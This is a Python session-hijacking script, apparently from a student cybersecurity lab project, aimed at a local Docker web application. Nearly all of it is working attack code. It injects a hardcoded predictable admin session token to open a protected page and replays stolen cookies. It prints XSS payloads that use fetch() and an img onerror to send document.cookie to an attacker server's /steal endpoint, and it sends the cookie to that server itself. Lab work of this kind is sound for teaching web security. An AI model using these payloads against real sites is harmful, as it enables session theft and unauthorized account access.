#!/usr/bin/env python3
import requests
import sys
from urllib.parse import urljoin

# Target application configuration
TARGET_URL = "http://localhost:5009"
ATTACKER_SERVER_URL = "http://localhost:8888"
SESSION_COOKIE_NAME = "PCYB_forum_session"
# Known/predictable session token from the application code
HIJACKED_SESSION_TOKEN = "admin_session_token_pcyb"


class SessionHijacker:
    """Demonstrates various session hijacking techniques"""
    
    def __init__(self, target_url=TARGET_URL):
        self.target_url = target_url
        self.session = requests.Session()
    
    def check_target_availability(self):
        """Check if target application is reachable"""
        try:
            response = self.session.get(self.target_url, timeout=5)
            print(f"[✓] Target application is reachable at {self.target_url}")
            print(f"[i] Response status: {response.status_code}")
            return True
        except requests.exceptions.ConnectionError:
            print(f"[✗] Cannot connect to {self.target_url}")
            print(f"[!] Make sure the Docker container is running:")
            print(f"    docker-compose -f aplikacja_celu/docker-compose.yml up")
            return False
        except Exception as e:
            print(f"[✗] Error: {e}")
            return False
    
    def hijack_session_predictable_token(self):
        """
        Attack Vector #1: Predictable Session Token
        The application uses a hardcoded, predictable session token.
        An attacker can simply inject this known token value.
        """
        print("\n" + "="*60)
        print("ATTACK VECTOR #1: Predictable Session Token")
        print("="*60)
        
        print(f"[i] Session cookie name: {SESSION_COOKIE_NAME}")
        print(f"[i] Predictable token value: {HIJACKED_SESSION_TOKEN}")
        
        # Inject the known session token
        self.session.cookies.set(SESSION_COOKIE_NAME, HIJACKED_SESSION_TOKEN)
        
        # Try to access protected resource
        protected_url = urljoin(self.target_url, "/protected")
        print(f"[*] Attempting to access: {protected_url}")
        
        response = self.session.get(protected_url)
        
        if response.status_code == 200 and "Witaj" in response.text:
            print("[✓] SESSION HIJACK SUCCESSFUL!")
            print(f"[✓] Gained unauthorized access to protected page")
            print(f"[✓] Response contains admin content")
            return True
        else:
            print("[✗] Session hijack failed")
            return False
    
    def demonstrate_cookie_theft_scenario(self):
        """
        Attack Vector #2: Cookie Theft via XSS
        Since httponly=False, JavaScript can access the cookie.
        This demonstrates what an attacker would extract via XSS.
        """
        print("\n" + "="*60)
        print("ATTACK VECTOR #2: Cookie Theft Simulation (XSS)")
        print("="*60)
        
        print("[i] The application sets cookies with httponly=False")
        print("[i] This allows JavaScript to access cookies via document.cookie")
        print(f"\n[i] Attacker's cookie stealing server: {ATTACKER_SERVER_URL}")
        print("\n[i] Example XSS payload that would steal the cookie:")
        print("    <script>")
        print(f"      fetch('{ATTACKER_SERVER_URL}/steal?cookie=' + document.cookie);")
        print("    </script>")
        
        print("\n[i] Or in a URL parameter (if reflected without sanitization):")
        print(f"    ?search=<img src=x onerror='new Image().src=\"{ATTACKER_SERVER_URL}/steal?c=\"+document.cookie'>")
        
        print("\n[*] In a real attack, the stolen cookie would be sent to:")
        print(f"    {ATTACKER_SERVER_URL}/steal?cookie={SESSION_COOKIE_NAME}={HIJACKED_SESSION_TOKEN}")
        print("\n[*] Simulating actual cookie theft...")
        
        # Actually send the stolen cookie to attacker's server
        try:
            stolen_data = f"{SESSION_COOKIE_NAME}={HIJACKED_SESSION_TOKEN}"
            response = requests.get(f"{ATTACKER_SERVER_URL}/steal", params={'cookie': stolen_data}, timeout=2)
            if response.status_code == 200:
                print(f"[✓] Cookie successfully sent to attacker's server!")
                print(f"[✓] Check attacker's dashboard at: {ATTACKER_SERVER_URL}")
            else:
                print(f"[!] Server responded with status: {response.status_code}")
        except requests.exceptions.ConnectionError:
            print(f"[!] Warning: Attacker's server not reachable at {ATTACKER_SERVER_URL}")
            print(f"[!] Make sure to run: docker-compose up -d")
        except Exception as e:
            print(f"[!] Error sending to attacker's server: {e}")
        
        print("\n[*] Attacker then uses this stolen cookie to hijack the session")
    
    def demonstrate_session_replay(self):
        """
        Attack Vector #3: Session Replay
        Demonstrates using a captured/stolen session cookie
        """
        print("\n" + "="*60)
        print("ATTACK VECTOR #3: Session Replay Attack")
        print("="*60)
        
        print("[i] Simulating scenario where attacker captured cookie from network traffic")
        print("[i] or obtained it through other means (XSS, MITM, etc.)")
        
        # Create a new session (simulating attacker's browser)
        attacker_session = requests.Session()
        
        # Inject the stolen cookie
        attacker_session.cookies.set(SESSION_COOKIE_NAME, HIJACKED_SESSION_TOKEN)
        
        print(f"[*] Attacker sets stolen cookie: {SESSION_COOKIE_NAME}={HIJACKED_SESSION_TOKEN}")
        print(f"[*] Attempting to access admin panel...")
        
        # Access protected resources
        protected_url = urljoin(self.target_url, "/protected")
        response = attacker_session.get(protected_url)
        
        if response.status_code == 200 and "admin" in response.text.lower():
            print("[✓] Session replay successful!")
            print("[✓] Attacker has full access to victim's session")
            print(f"[i] Can access all pages as the authenticated user")
            return True
        else:
            print("[✗] Session replay failed")
            return False
    
    def extract_session_info(self):
        """Extract and display session information"""
        print("\n" + "="*60)
        print("SESSION INFORMATION EXTRACTION")
        print("="*60)
        
        protected_url = urljoin(self.target_url, "/protected")
        response = self.session.get(protected_url)
        
        print(f"[i] Current cookies in session:")
        for cookie in self.session.cookies:
            print(f"    Name: {cookie.name}")
            print(f"    Value: {cookie.value}")
            print(f"    Domain: {cookie.domain}")
            print(f"    Path: {cookie.path}")
            print(f"    Secure: {cookie.secure}")
            print(f"    HttpOnly: {cookie.has_nonstandard_attr('HttpOnly')}")
            print()


def main():
    print("""
╔═══════════════════════════════════════════════════════════╗
║     SESSION HIJACKING DEMONSTRATION                       ║
║     PCYB Cybersecurity Project                            ║
║     Educational Purpose Only - Authorized Testing         ║
╚═══════════════════════════════════════════════════════════╝
    """)
    
    # Initialize hijacker
    hijacker = SessionHijacker()
    
    # Check if target is available
    if not hijacker.check_target_availability():
        sys.exit(1)
    
    # Demonstrate different attack vectors
    print("\n[*] Starting demonstration of session hijacking techniques...")
    
    # Attack 1: Predictable token
    success = hijacker.hijack_session_predictable_token()
    
    # Attack 2: XSS cookie theft (educational explanation)
    hijacker.demonstrate_cookie_theft_scenario()
    
    # Attack 3: Session replay
    hijacker.demonstrate_session_replay()
    
    # Extract session info
    hijacker.extract_session_info()
    
    print("\n[✓] Demonstration completed successfully" if success else "\n[!] Some demonstrations failed")

if __name__ == "__main__":
    main()
